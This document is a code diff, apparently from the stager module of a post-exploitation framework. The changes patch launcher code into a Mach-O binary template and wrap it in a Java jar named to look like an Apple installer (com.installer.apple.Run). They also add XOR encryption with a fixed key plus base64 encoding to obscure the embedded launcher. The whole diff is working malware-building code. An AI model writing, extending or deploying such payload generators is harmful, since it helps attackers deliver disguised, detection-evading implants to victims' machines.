@@ -22,6 +22,8 @@ import macholib.MachO
 import shutil
 import zipfile
 import subprocess
+from itertools import izip, cycle
+import base64
 
 
 class Stagers:
@@ -146,14 +148,17 @@ class Stagers:
                     count += 1
                     for section in cmd[count]:
                         if section.sectname.strip('\x00') == '__cstring':
-                            offset = int(section.offset)
-                            placeHolderSz = int(section.size) - 13
+                            offset = int(section.offset) + (int(section.size) - 2119)
+                            placeHolderSz = int(section.size) - (int(section.size) - 2119)
 
         template = f.read()
         f.close()
 
         if placeHolderSz and offset:
 
+            key = 'subF'
+            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(launcherCode, cycle(key)))
+            launcherCode = base64.urlsafe_b64encode(launcherCode)
             launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
@@ -426,7 +431,7 @@ class Stagers:
         return package
 
     def generate_jar(self, launcherCode):
-        file = open(self.mainMenu.installPath+'/data/misc/Run.java','r')
+        file = open(self.mainMenu.installPath+'data/misc/Run.java','r')
         javacode = file.read()
         file.close()
         javacode = javacode.replace("LAUNCHER",launcherCode)
@@ -436,7 +441,7 @@ class Stagers:
         currdir = os.getcwd()
         os.chdir(self.mainMenu.installPath+'data/misc/classes/')
         os.system('javac com/installer/apple/Run.java')
-        os.system('jar -cvfm '+self.mainMenu.installPath+'Run.jar ../Manifest.txt com/installer/apple/Run.class')
+        os.system('jar -cfe '+self.mainMenu.installPath+'Run.jar com.installer.apple.Run com/installer/apple/Run.class')
         os.chdir(currdir)
         os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
         os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
